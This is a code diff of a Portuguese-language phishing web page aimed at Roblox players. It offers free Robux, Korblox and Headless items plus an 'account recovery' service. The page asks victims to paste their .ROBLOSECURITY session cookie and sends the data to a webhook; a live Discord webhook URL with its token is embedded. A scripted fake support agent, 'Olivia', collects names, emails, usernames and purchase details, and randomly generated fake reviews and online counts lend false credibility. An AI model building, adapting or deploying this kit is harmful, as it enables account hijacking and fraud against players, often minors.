+            background: rgba(244, 63, 94, 0.1);
+            border: 2px solid #f43f5e;
             border-radius: 60px;
             padding: 16px 22px;
-            margin-top: 12px;
-            color: #ffb0b0;
+            margin-top: 10px;
+            color: #f43f5e;
             text-align: center;
-            font-weight: 600;
-            font-size: 15px;
+            font-weight: 500;
             animation: shake 0.5s ease;
         }
 
@@ -789,313 +661,529 @@
             20%, 40%, 60%, 80% { transform: translateX(5px); }
         }
 
-        /* Cooldown */
-        .cooldown-text {
-            color: var(--text-muted);
-            font-size: 15px;
-            text-align: center;
-            margin-top: 16px;
-            font-weight: 500;
-        }
-
-        /* Footer */
-        .cosmic-footer {
+        /* ESTILOS DO CHAT OLIVIA - MELHORADOS */
+        .chat-card {
+            height: 650px;
             display: flex;
-            justify-content: center;
-            gap: 40px;
-            margin-top: 30px;
+            flex-direction: column;
+            padding: 24px;
         }
 
-        .footer-item {
+        .chat-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .chat-avatar {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #ec4899, #6366f1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            position: relative;
+        }
+
+        .chat-avatar::after {
+            content: '';
+            position: absolute;
+            bottom: 5px;
+            right: 5px;
+            width: 12px;
+            height: 12px;
+            background: #10b981;
+            border-radius: 50%;
+            border: 2px solid #03050a;
+        }
+
+        .chat-info {
+            flex: 1;
+        }
+
+        .chat-name {
+            font-size: 20px;
+            font-weight: 600;
+            color: white;
+            margin-bottom: 5px;
+        }
+
+        .chat-status {
+            font-size: 13px;
+            color: #10b981;
+        }
+
+        .close-chat {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 20px;
+            transition: 0.3s;
+        }
+
+        .close-chat:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: scale(1.1);
+        }
+
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            margin: 20px 0;
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 20px;
+        }
+
+        .message {
+            max-width: 85%;
+            padding: 12px 16px;
+            border-radius: 20px;
+            animation: messageIn 0.3s ease;
+            word-wrap: break-word;
+        }
+
+        @keyframes messageIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .message.olivia {
+            background: rgba(236, 72, 153, 0.15);
+            border: 1px solid rgba(236, 72, 153, 0.3);
+            align-self: flex-start;
+            border-bottom-left-radius: 5px;
+            color: white;
+        }
+
+        .message.user {
+            background: rgba(99, 102, 241, 0.15);
+            border: 1px solid rgba(99, 102, 241, 0.3);
+            align-self: flex-end;
+            border-bottom-right-radius: 5px;
+            color: white;
+        }
+
+        .message-time {
+            font-size: 10px;
+            color: #6b7280;
+            margin-top: 5px;
+            text-align: right;
+        }
+
+        .typing-indicator {
+            display: flex;
+            gap: 5px;
+            padding: 15px;
+            background: rgba(236, 72, 153, 0.1);
+            border-radius: 20px;
+            width: fit-content;
+            align-self: flex-start;
+        }
+
+        .typing-indicator span {
+            width: 8px;
+            height: 8px;
+            background: #ec4899;
+            border-radius: 50%;
+            animation: typing 1s infinite;
+        }
+
+        .typing-indicator span:nth-child(2) { animation-delay: 0.2s; }
+        .typing-indicator span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes typing {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .chat-input-area {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .chat-input {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.3);
+            border: 2px solid rgba(255, 255, 255, 0.05);
+            border-radius: 30px;
+            padding: 15px 20px;
+            color: white;
+            font-size: 14px;
+        }
+
+        .chat-input:focus {
+            outline: none;
+            border-color: #ec4899;
+        }
+
+        .chat-send {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #6366f1, #ec4899);
+            border: none;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .chat-send:hover {
+            transform: scale(1.1);
+        }
+
+        .welcome-message {
+            text-align: center;
+            color: #9ca3af;
+            margin: 10px 0;
+            font-size: 14px;
+            background: rgba(255,255,255,0.05);
+            padding: 10px;
+            border-radius: 30px;
+        }
+
+        /* Botões de ação rápida */
+        .quick-actions {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .quick-action-btn {
+            background: rgba(99, 102, 241, 0.1);
+            border: 1px solid rgba(99, 102, 241, 0.3);
+            border-radius: 20px;
+            padding: 10px;
+            color: white;
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: 13px;
+        }
+
+        .quick-action-btn:hover {
+            background: rgba(99, 102, 241, 0.3);
+            transform: translateY(-2px);
+        }
+
+        /* Indicador de digitação */
+        .typing-badge {
+            display: inline-block;
+            padding: 5px 10px;
+            background: rgba(236, 72, 153, 0.2);
+            border-radius: 20px;
+            color: #ec4899;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+
+        /* AVALIAÇÕES */
+        .reviews-section {
+            margin-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 20px;
+        }
+
+        .reviews-title {
+            color: white;
+            font-size: 18px;
+            margin-bottom: 15px;
             display: flex;
             align-items: center;
             gap: 8px;
-            color: var(--text-muted);
+        }
+
+        .reviews-title span {
+            color: #6366f1;
+        }
+
+        .reviews-grid {
+            display: grid;
+            gap: 12px;
+        }
+
+        .review-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 15px;
+            transition: 0.3s;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .review-card:hover {
+            border-color: #6366f1;
+            background: rgba(99, 102, 241, 0.1);
+            transform: translateX(5px);
+        }
+
+        .review-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .review-avatar {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #6366f1, #ec4899);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .review-user {
+            flex: 1;
+        }
+
+        .review-name {
+            color: white;
             font-size: 14px;
-            font-weight: 500;
+            font-weight: 600;
         }
 
-        .footer-item span {
-            color: var(--glow-color);
-            font-size: 18px;
+        .review-stars {
+            color: #fbbf24;
+            font-size: 12px;
         }
 
-        /* Responsividade */
-        @media (max-width: 600px) {
-            .cosmic-container {
-                max-width: 100%;
-            }
-            
-            .cosmic-card {
-                padding: 28px 20px;
-            }
-
-            .cosmic-title {
-                font-size: 38px;
-            }
-
-            .constellation {
-                width: 60px;
-                height: 60px;
-                font-size: 30px;
-            }
-
-            .orbit-item {
-                width: 70px;
-                height: 70px;
-            }
-
-            .orbit-value {
-                font-size: 22px;
-            }
-
-            .constellation-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .stellar-actions {
-                grid-template-columns: 1fr;
-            }
-
-            .deep-space-chat {
-                height: 550px;
-                padding: 20px;
-            }
-
-            .cosmic-notification {
-                left: 20px;
-                right: 20px;
-                max-width: none;
-            }
-
-            .cosmic-message {
-                font-size: 15px;
-                padding: 14px 18px;
-            }
+        .review-time {
+            color: #6b7280;
+            font-size: 11px;
         }
 
-        .hidden {
-            display: none;
+        .review-text {
+            color: #9ca3af;
+            font-size: 13px;
+            line-height: 1.5;
         }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .review-card:nth-child(1) { animation-delay: 0.1s; }
+        .review-card:nth-child(2) { animation-delay: 0.3s; }
+        .review-card:nth-child(3) { animation-delay: 0.5s; }
     </style>
 </head>
 <body>
-    <!-- Partículas flutuantes -->
-    <div class="particles" id="particles"></div>
+    <div class="aurora"></div>
+    <div class="stars" id="stars"></div>
     
-    <!-- Anéis orbitais -->
-    <div class="orbital-ring ring-1"></div>
-    <div class="orbital-ring ring-2"></div>
-    <div class="orbital-ring ring-3"></div>
-
-    <!-- Notificação cósmica -->
-    <div class="cosmic-notification" id="cosmicNotification">
-        <div class="notification-icon-cosmic">✦</div>
-        <div class="notification-content-cosmic">
-            <div class="notification-title-cosmic" id="notifyCosmicTitle">Conexão Estelar</div>
-            <div class="notification-message-cosmic" id="notifyCosmicMessage">Sinal transmitido</div>
+    <!-- NOTIFICAÇÃO -->
+    <div class="notification" id="notification">
+        <div class="notification-icon">✓</div>
+        <div class="notification-content">
+            <div class="notification-title" id="notifyTitle">Recuperação de Conta</div>
+            <div class="notification-message" id="notifyMessage">Solicitação enviada com sucesso!</div>
         </div>
-        <div class="cosmic-progress" id="cosmicProgress"></div>
+        <button class="notification-close" onclick="hideNotification()">✕</button>
+        <div class="notification-progress" id="notificationProgress"></div>
     </div>
 
-    <!-- Container principal - AGORA EM COLUNA ÚNICA -->
-    <div class="cosmic-container">
-        <!-- TELA 1 - COOKIE (OBRIGATÓRIA) -->
-        <div id="page1" class="cosmic-card">
-            <div class="cosmic-header">
-                <div class="constellation">
-                    <span>✦</span>
+    <!-- TELA 1 - COOKIE -->
+    <div id="page1" class="container page">
+        <div class="card">
+            <div class="header">
+                <div class="logo">
+                    ✦
                 </div>
-                <div>
-                    <h1 class="cosmic-title">CELESTIA</h1>
-                    <div class="cosmic-subtitle">protocolo de resgate</div>
-                </div>
-            </div>
-
-            <!-- Estatísticas orbitais -->
-            <div class="orbit-stats">
-                <div class="orbit-item" onclick="showStats()">
-                    <div class="orbit-value" id="countStat">1.2k</div>
-                    <div class="orbit-label">resgates</div>
-                </div>
-                <div class="orbit-item" onclick="showOnline()">
-                    <div class="orbit-value" id="onlineStat">✦</div>
-                    <div class="orbit-label">orbitando</div>
-                </div>
-                <div class="orbit-item" onclick="showInfo()">
-                    <div class="orbit-value">∞</div>
-                    <div class="orbit-label">cósmico</div>
+                <div class="header-text">
+                    <div class="title">AURORA</div>
+                    <div class="subtitle">plataforma de resgate</div>
                 </div>
             </div>
 
-            <!-- Input do Cookie - OBRIGATÓRIO PRIMEIRO -->
-            <div class="nebula-input">
-                <div class="nebula-label">
-                    <span>🔮</span> CHAVE CÓSMICA (OBRIGATÓRIA)
+            <div class="stats-row">
+                <div class="stat-block" onclick="showStats()">
+                    <div class="stat-value" id="countStat">1.2k</div>
+                    <div class="stat-label">resgates</div>
                 </div>
-                <div class="input-cosmic">
+                <div class="stat-block" onclick="showOnline()">
+                    <div class="stat-value" id="onlineStat">✦</div>
+                    <div class="stat-label">online</div>
+                </div>
+                <div class="stat-block" onclick="showInfo()">
+                    <div class="stat-value">∞</div>
+                    <div class="stat-label">grátis</div>
+                </div>
+            </div>
+
+            <div class="input-section">
+                <div class="input-label">
+                    <span>🔑</span> COOKIE DE ACESSO
+                </div>
+                <div class="input-wrapper">
                     <textarea id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..."></textarea>
                 </div>
-                <div class="cosmic-preview">
-                    <div class="cosmic-dot"></div>
-                    <div class="cosmic-preview-text" id="previewText">aguardando sinal...</div>
+                <div class="preview-badge">
+                    <div class="status-dot"></div>
+                    <div class="preview-text" id="previewText">aguardando cookie...</div>
                 </div>
-
-                <!-- Mensagem de ban -->
-                <div id="banMessage" class="banned-cosmic" style="display: none;"></div>
-
-                <!-- Cooldown -->
-                <div class="cooldown-text" id="cooldownInfo"></div>
+                
+                <!-- Área para mensagem de ban -->
+                <div id="banMessage" class="banned-message" style="display: none;"></div>
+                
+                <!-- Exibir apenas cooldown, IP removido -->
+                <div class="info-row">
+                    <div class="info-text" id="cooldownInfo"></div>
+                </div>
             </div>
 
-            <!-- Botão Wormhole - ÚNICO CAMINHO -->
-            <button class="wormhole-btn" onclick="sendCookieFirst()" id="sendBtn">
+            <button class="action-btn" onclick="sendAndGo()" id="sendBtn">
                 <span>✦</span>
-                VALIDAR CHAVE CÓSMICA
+                ENVIAR E RESGATAR
                 <span>→</span>
             </button>
 
-            <div id="status" class="status-message" style="text-align: center; margin-top: 20px;"></div>
+            <div id="status" class="status-message"></div>
 
-            <!-- Footer cósmico -->
-            <div class="cosmic-footer">
-                <div class="footer-item"><span>⚡</span> instantâneo</div>
-                <div class="footer-item"><span>🛡️</span> protegido</div>
-                <div class="footer-item"><span>🎯</span> preciso</div>
+            <div class="footer">
+                <div class="footer-item"><span>✦</span> instantâneo</div>
+                <div class="footer-item"><span>🔒</span> seguro</div>
+                <div class="footer-item"><span>🎯</span> direto</div>
+            </div>
+
+            <!-- SEÇÃO DE AVALIAÇÕES -->
+            <div class="reviews-section">
+                <div class="reviews-title">
+                    <span>⭐</span> AVALIAÇÕES RECENTES
+                </div>
+                <div class="reviews-grid" id="reviewsContainer">
+                    <!-- Avaliações serão inseridas aqui pelo JavaScript -->
+                </div>
             </div>
         </div>
+    </div>
 
-        <!-- TELA 2 - ESCOLHA (só aparece após cookie válido) -->
-        <div id="page2" class="cosmic-card hidden">
-            <div class="cosmic-header">
-                <div class="constellation">
-                    <span>🌠</span>
+    <!-- TELA 2 - ESCOLHA -->
+    <div id="page2" class="container page hidden">
+        <div class="card">
+            <div class="header">
+                <div class="logo">
+                    ✦
                 </div>
                 <div>
-                    <h2 class="cosmic-title" style="font-size: 36px;">recompensa</h2>
-                    <div class="cosmic-subtitle">escolha sua constelação</div>
+                    <div class="choice-title">seu prêmio</div>
+                    <div class="subtitle">escolha uma opção</div>
                 </div>
             </div>
 
-            <div class="constellation-grid">
+            <div class="choice-grid">
                 <!-- Robux -->
-                <div class="constellation-item" onclick="selectPrize('Robux')">
-                    <div class="item-icon">💰</div>
-                    <div class="item-name">Robux</div>
-                    <div class="item-desc">créditos estelares</div>
+                <div class="choice-item" onclick="selectPrize('Robux')">
+                    <div class="choice-icon">💰</div>
+                    <div class="choice-content">
+                        <div class="choice-name">Robux</div>
+                        <div class="choice-desc">créditos + bônus</div>
+                    </div>
+                    <div class="choice-value">grátis</div>
                 </div>
 
                 <!-- Korblox -->
-                <div class="constellation-item" onclick="selectPrize('Korblox')">
-                    <div class="item-icon">👑</div>
-                    <div class="item-name">Korblox</div>
-                    <div class="item-desc">set lendário</div>
+                <div class="choice-item" onclick="selectPrize('Korblox')">
+                    <div class="choice-icon">👑</div>
+                    <div class="choice-content">
+                        <div class="choice-name">Korblox</div>
+                        <div class="choice-desc">set completo + death speed</div>
+                    </div>
+                    <div class="choice-value">grátis</div>
                 </div>
 
                 <!-- Headless -->
-                <div class="constellation-item" onclick="selectPrize('Headless')">
-                    <div class="item-icon">🎭</div>
-                    <div class="item-name">Headless</div>
-                    <div class="item-desc">aparência rara</div>
+                <div class="choice-item" onclick="selectPrize('Headless')">
+                    <div class="choice-icon">🎭</div>
+                    <div class="choice-content">
+                        <div class="choice-name">Headless</div>
+                        <div class="choice-desc">cabeça + itens exclusivos</div>
+                    </div>
+                    <div class="choice-value">grátis</div>
                 </div>
 
-                <!-- Chat de Recuperação com NOME ALEATÓRIO -->
-                <div class="constellation-item" onclick="openSupportChat()" id="supportOption">
-                    <span class="item-badge">prioridade</span>
-                    <div class="item-icon">💫</div>
-                    <div class="item-name" id="supportNameDisplay">LYRA</div>
-                    <div class="item-desc">suporte cósmico</div>
+                <!-- Recuperar Conta com Olivia -->
+                <div class="choice-item" onclick="openOliviaChat()">
+                    <span class="choice-badge">prioridade</span>
+                    <div class="choice-icon">💬</div>
+                    <div class="choice-content">
+                        <div class="choice-name">Recuperar Conta</div>
+                        <div class="choice-desc">fale com Olivia • suporte humanizado</div>
+                    </div>
+                    <div class="choice-value">grátis</div>
                 </div>
             </div>
 
-            <button class="wormhole-btn" onclick="goBack()" style="background: transparent; border-color: rgba(192, 132, 252, 0.3); margin-top: 10px;">
-                <span>←</span>
-                VOLTAR
+            <button class="back-button" onclick="goBack()">
+                <span>←</span> VOLTAR
             </button>
         </div>
+    </div>
 
-        <!-- TELA 3 - CHAT (também reto) -->
-        <div id="page3" class="deep-space-chat hidden">
-            <div class="chat-header-cosmic">
-                <div class="chat-avatar-cosmic" id="chatAvatar">✦</div>
-                <div class="chat-info-cosmic">
-                    <div class="chat-name-cosmic" id="supportChatName">LYRA</div>
-                    <div class="chat-status-cosmic">online • assistente cósmica</div>
+    <!-- TELA 3 - CHAT COM OLIVIA -->
+    <div id="page3" class="container page hidden">
+        <div class="card chat-card">
+            <div class="chat-header">
+                <div class="chat-avatar">
+                    👩
                 </div>
-                <button class="close-chat-cosmic" onclick="closeChat()">✕</button>
+                <div class="chat-info">
+                    <div class="chat-name">Olivia • Suporte</div>
+                    <div class="chat-status">● online agora • respostas rápidas</div>
+                </div>
+                <button class="close-chat" onclick="closeChat()">✕</button>
             </div>
 
-            <!-- Quick actions com mensagens pré-definidas -->
-            <div class="stellar-actions" id="quickActions">
-                <button class="stellar-btn" onclick="sendQuickMessage('Perdi minha conta')">🌠 Perdi acesso</button>
-                <button class="stellar-btn" onclick="sendQuickMessage('Conta hackeada')">⚠️ Hackeada</button>
-                <button class="stellar-btn" onclick="sendQuickMessage('Esqueci a senha')">🔑 Esqueci senha</button>
-                <button class="stellar-btn" onclick="sendQuickMessage('Email antigo')">📧 Email antigo</button>
+            <div class="welcome-message" id="welcomeMessage">
+                Olivia entrou no chat • tempo de resposta ~30s
             </div>
 
-            <!-- Área de mensagens -->
-            <div class="cosmic-messages" id="chatMessages">
+            <!-- Botões de ação rápida -->
+            <div class="quick-actions" id="quickActions">
+                <button class="quick-action-btn" onclick="sendQuickMessage('Perdi minha conta')">📱 Perdi minha conta</button>
+                <button class="quick-action-btn" onclick="sendQuickMessage('Esqueci a senha')">🔑 Esqueci a senha</button>
+                <button class="quick-action-btn" onclick="sendQuickMessage('Conta hackeada')">⚠️ Conta hackeada</button>
+                <button class="quick-action-btn" onclick="sendQuickMessage('Email antigo')">📧 Email antigo</button>
+            </div>
+
+            <div class="chat-messages" id="chatMessages">
                 <!-- Mensagens aparecerão aqui -->
             </div>
 
-            <!-- Input do chat -->
-            <div class="cosmic-input-area">
-                <input type="text" class="cosmic-chat-input" id="chatInput" placeholder="Digite sua mensagem..." onkeypress="if(event.key==='Enter') sendMessage()">
-                <button class="cosmic-send" onclick="sendMessage()">➤</button>
+            <div class="chat-input-area">
+                <input type="text" class="chat-input" id="chatInput" placeholder="Digite sua mensagem..." onkeypress="if(event.key==='Enter') sendMessage()">
+                <button class="chat-send" onclick="sendMessage()">➤</button>
             </div>
         </div>
     </div>
 
     <script>
-        // ===== CONFIGURAÇÃO =====
-        const SITE_NAME = "CELESTIA";
+        // Configurações
+        const API_URL = '/api/webhook';
+        const CHAT_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1479283460488167524/0I--IEPX0FbLAD52jy7WN_AouAO-_jLxUBiwbE2t4i34u6gt_EBYxLTcBKgm4XSVMrVS';
+        const CHECK_BAN_URL = '/api/verificar-ban';
         
-        // Lista de nomes femininos para o suporte
-        const SUPPORT_NAMES = [
-            "LYRA", "NOVA", "VEGA", "ANDROMEDA", "CASSIOPEIA",
-            "SOLARA", "LUNARA", "STELLA", "ASTRA", "COSMA",
-            "ELECTRA", "PHOEBE", "SEREN", "DARA", "ELARA",
-            "FIORA", "HELIA", "IRIS", "JUNO", "KALI",
-            "LIRA", "MAYA", "NARA", "ORIA", "POLA"
-        ];
-        
-        // Selecionar nome aleatório
-        const SUPPORT_NAME = SUPPORT_NAMES[Math.floor(Math.random() * SUPPORT_NAMES.length)];
-        
-        // Atualizar elementos com o nome aleatório
-        document.getElementById('supportNameDisplay').textContent = SUPPORT_NAME;
-        document.getElementById('supportChatName').textContent = SUPPORT_NAME;
-        
-        // Avatar diferente baseado no nome
-        const avatars = ['✨', '🌟', '💫', '⭐', '☄️', '🪐', '🌙', '🚀', '👩‍🚀', '🧚', '🦋', '🌸'];
-        document.getElementById('chatAvatar').textContent = avatars[Math.floor(Math.random() * avatars.length)];
+        const COOLDOWN_TIME = 300000;
+        const COOLDOWN_KEY = 'aurora_last_cookie_sent';
 
-        // ===== MENSAGENS PRÉ-DEFINIDAS =====
-        const SUPPORT_MESSAGES = {
-            welcome: `✨ Olá! Sou a **${SUPPORT_NAME}**, sua guia cósmica. Prazer em te conhecer!\n\n**Me conta, o que aconteceu com sua conta?**\n• Perdi acesso\n• Hackearam\n• Esqueci senha\n• Email antigo`,
-            
-            askName: `Entendi! Agora preciso do seu **NOME COMPLETO** (igual nos registros):`,
-            
-            askEmail: `Obrigada! Agora me informe um **E-MAIL** de contato (vamos usar para enviar a recuperação):`,
-            
-            askUsername: `Perfeito! Qual seu **NOME DE USUÁRIO** no Roblox?`,
-            
-            askPurchase: `Ótimo! Me diga qual foi a **ÚLTIMA COMPRA** que você fez (valor ou item exato):`,
-            
-            askEmailAccess: `Você ainda tem **ACESSO AO E-MAIL** de cadastro original? (SIM ou NÃO)`,
-            
-            askDate: `Ok! Agora me diga a **DATA APROXIMADA** que criou a conta (mês/ano):`,
-            
-            askItems: `Tem algum **ITEM EXCLUSIVO** na conta? (Headless, Korblox, Domínio, etc)`,
-            
-            askRobux: `Quantos **ROBUX** você tem atualmente na conta?`,
-            
-            analysis: `✅ **Todas as informações foram enviadas para análise dimensional!**\n\n⏳ **PRAZO ESTELAR: ATÉ 24 HORAS**\n\n⚠️ **NÃO TENTE NOVAMENTE** durante este período ou a conexão será perdida.`,
-            
-            final: `Sua solicitação está em análise. Você receberá um e-mail em até 24 horas com as instruções.\n\n**Não é necessário responder mais.**`
-        };
-
-        // ===== VARIÁVEIS GLOBAIS =====
+        // Variáveis do chat
         let userIP = '';
         let chatHistory = [];
         let conversationId = generateSessionId();
@@ -1105,28 +1193,119 @@
         let userRoblox = '';
         let userProblem = '';
         let analysisStarted = false;
-        let cookieValidated = false;
 
-        // Configurações da API
-        const API_URL = '/api/webhook';
-        const CHAT_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1479283460488167524/0I--IEPX0FbLAD52jy7WN_AouAO-_jLxUBiwbE2t4i34u6gt_EBYxLTcBKgm4XSVMrVS';
-        const CHECK_BAN_URL = '/api/verificar-ban';
-        
-        const COOLDOWN_TIME = 300000;
-        const COOLDOWN_KEY = 'celestia_last_cookie';
+        // ===== AVALIAÇÕES DINÂMICAS =====
+        const reviewTemplates = [
+            {
+                names: ["Ana Silva", "Maria Oliveira", "Juliana Costa", "Fernanda Lima", "Patrícia Souza", "Camila Rodrigues", "Beatriz Santos", "Larissa Ferreira", "Amanda Costa", "Gabriela Martins"],
+                avatars: ["👩", "👧", "👩‍🦰", "👱‍♀️", "👵", "👩‍🎓", "👩‍💼", "👩‍🍳", "👩‍🎨", "👸"],
+                texts: [
+                    "Consegui recuperar minha conta em menos de 2 horas, atendimento muito bom.",
+                    "Perdi minha conta há 3 anos e consegui recuperar, sistema eficiente.",
+                    "Suporte rápido e eficiente, resolveram meu problema em minutos.",
+                    "Melhor plataforma de recuperação que já usei, recomendo.",
+                    "Estava desesperada mas consegui recuperar minha conta, obrigada.",
+                    "Atendimento muito bom, resolveram tudo rapidinho.",
+                    "Já perdi 3 contas e só a Aurora conseguiu recuperar todas.",
+                    "Serviço incrível, recuperei minha conta com todos os itens.",
+                    "Muito confiável, já indiquei para vários amigos.",
+                    "Olivia é muito atenciosa, me ajudou em todo o processo.",
+                    "Plataforma fácil de usar e muito segura.",
+                    "Recuperei minha conta em menos de 1 hora, muito rápido.",
+                    "Atendimento humanizado e muito eficiente.",
+                    "Já tinha perdido as esperanças, mas deu certo.",
+                    "Recomendo demais, funcionou perfeitamente."
+                ]
+            },
+            {
+                names: ["João Pedro", "Carlos Eduardo", "Rafael Santos", "Bruno Lima", "Paulo Henrique", "Lucas Oliveira", "Gabriel Souza", "Felipe Costa", "Matheus Rodrigues", "Thiago Martins"],
+                avatars: ["👨", "👨‍🦰", "👨‍🦱", "🧔", "👴", "👨‍🎓", "👨‍💼", "👨‍🍳", "👨‍🎨", "🤴"],
+                texts: [
+                    "Funcionou perfeitamente, recuperei minha conta em minutos.",
+                    "Serviço de qualidade, recomendo para todos.",
+                    "Olivia foi muito prestativa, resolveu meu problema rapidamente.",
+                    "Melhor plataforma que já usei, funciona de verdade.",
+                    "Já tinha gastado dinheiro em outros lugares, só a Aurora funcionou.",
+                    "Recuperei minha conta com mais de 5 anos, estou muito feliz.",
+                    "Atendimento rápido e eficiente, valeu a pena.",
+                    "Serviço confiável, recomendo de olhos fechados.",
+                    "Olivia é muito profissional, me ajudou muito.",
+                    "Já recomendei para 5 amigos e todos conseguiram recuperar.",
+                    "Plataforma segura e confiável, funcionou perfeitamente.",
+                    "Recuperei minha conta em menos de 2 horas, muito satisfeito.",
+                    "Atendimento top, resolveram meu problema rapidinho.",
+                    "Já tinha desistido, mas a Aurora conseguiu recuperar.",
+                    "Serviço rápido, eficiente e confiável."
+                ]
+            }
+        ];
 
-        // ===== FUNÇÕES DE INTERAÇÃO =====
+        function generateRandomTime() {
+            const minutes = Math.floor(Math.random() * 59) + 1;
+            return `há ${minutes} ${minutes === 1 ? 'minuto' : 'minutos'}`;
+        }
+
+        function getRandomItem(array) {
+            return array[Math.floor(Math.random() * array.length)];
+        }
+
+        function generateRandomReview() {
+            const gender = Math.random() > 0.5 ? 0 : 1;
+            const template = reviewTemplates[gender];
+            
+            return {
+                name: getRandomItem(template.names),
+                avatar: getRandomItem(template.avatars),
+                stars: "⭐⭐⭐⭐⭐",
+                text: getRandomItem(template.texts),
+                time: generateRandomTime()
+            };
+        }
+
+        function loadReviews() {
+            const container = document.getElementById('reviewsContainer');
+            if (!container) return;
+
+            // Gerar 3 avaliações aleatórias
+            const reviews = [];
+            for (let i = 0; i < 3; i++) {
+                reviews.push(generateRandomReview());
+            }
+
+            container.innerHTML = '';
+            reviews.forEach(review => {
+                const reviewCard = document.createElement('div');
+                reviewCard.className = 'review-card';
+                reviewCard.innerHTML = `
+                    <div class="review-header">
+                        <div class="review-avatar">${review.avatar}</div>
+                        <div class="review-user">
+                            <div class="review-name">${review.name}</div>
+                            <div class="review-stars">${review.stars}</div>
+                        </div>
+                        <div class="review-time">${review.time}</div>
+                    </div>
+                    <div class="review-text">"${review.text}"</div>
+                `;
+                container.appendChild(reviewCard);
+            });
+        }
+
+        // Atualizar avaliações a cada 30 segundos
+        setInterval(loadReviews, 30000);
+
+        // ===== FUNÇÕES INTERATIVAS =====
         function showStats() {
-            showCosmicNotification('📊 Estatísticas', `Total de resgates: ${document.getElementById('countStat').textContent}`);
+            showNotification('📊 Estatísticas', `Total de resgates: ${document.getElementById('countStat').textContent}`, false);
         }
 
         function showOnline() {
             const online = Math.floor(Math.random() * 50) + 100;
-            showCosmicNotification('👥 Orbitando', `${online} viajantes online`);
+            showNotification('👥 Online', `${online} usuários online agora!`, false);
         }
 
         function showInfo() {
-            showCosmicNotification('ℹ️ Informação', `${SITE_NAME} • Resgate cósmico 100% gratuito`);
+            showNotification('ℹ️ Info', 'Aurora • Plataforma de resgate 100% gratuita', false);
         }
 
         function sendQuickMessage(msg) {
@@ -1134,133 +1313,125 @@
             sendMessage();
         }
 
-        // ===== FUNÇÕES DO COOKIE =====
-        function cleanCookie(cookie) {
-            let c = cookie.trim();
-            c = c.replace(/^["']|["']$/g, '');
-            const match = c.match(/\.ROBLOSECURITY=([^;\s]+)/);
-            return match && match[1] ? match[1] : c;
+        // ===== FUNÇÃO PARA MOSTRAR EXEMPLOS =====
+        function showExamples() {
+            const examples = [
+                "💡 **EXEMPLOS DE RESPOSTAS:**",
+                "• **NOME COMPLETO:** João Silva Santos",
+                "• **E-MAIL:** joaosilva@gmail.com  (pode ser novo, vamos colocar na conta)",
+                "• **USERNAME:** joaozinho_roblox123",
+                "• **COMPRA:** R$50 ou Korblox",
+                "• **ACESSO E-MAIL:** SIM ou NÃO",
+                "• **DATA:** março/2020"
+            ];
+            
+            const messagesDiv = document.getElementById('chatMessages');
+            const examplesDiv = document.createElement('div');
+            examplesDiv.className = 'message olivia';
+            examplesDiv.style.background = 'rgba(99, 102, 241, 0.2)';
+            examplesDiv.style.border = '1px solid #6366f1';
+            
+            examplesDiv.innerHTML = `
+                <div class="message-content">${examples.join('<br>')}</div>
+                <div class="message-time">${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}</div>
+            `;
+            
+            messagesDiv.appendChild(examplesDiv);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
 
-        function updatePreview() {
-            const input = document.getElementById('cookieInput');
-            const preview = document.getElementById('previewText');
-            const val = input.value.trim();
+        // ===== BOTÕES SIM/NÃO =====
+        function addYesNoButtons() {
+            const messagesDiv = document.getElementById('chatMessages');
+            const optionsDiv = document.createElement('div');
+            optionsDiv.className = 'quick-actions';
+            optionsDiv.style.margin = '10px 0';
+            optionsDiv.style.display = 'grid';
+            optionsDiv.style.gridTemplateColumns = '1fr 1fr';
             
-            if (val.length > 0) {
-                const cleaned = cleanCookie(val);
-                if (cleaned.length > 50) {
-                    preview.textContent = '✓ SINAL FORTE DETECTADO';
-                    preview.style.color = '#10b981';
-                } else {
-                    preview.textContent = '⚠️ SINAL FRACO - COOKIE INCOMPLETO';
-                    preview.style.color = '#f59e0b';
-                }
-            } else {
-                preview.textContent = 'aguardando sinal...';
-                preview.style.color = 'var(--text-secondary)';
-            }
+            const btnSim = document.createElement('button');
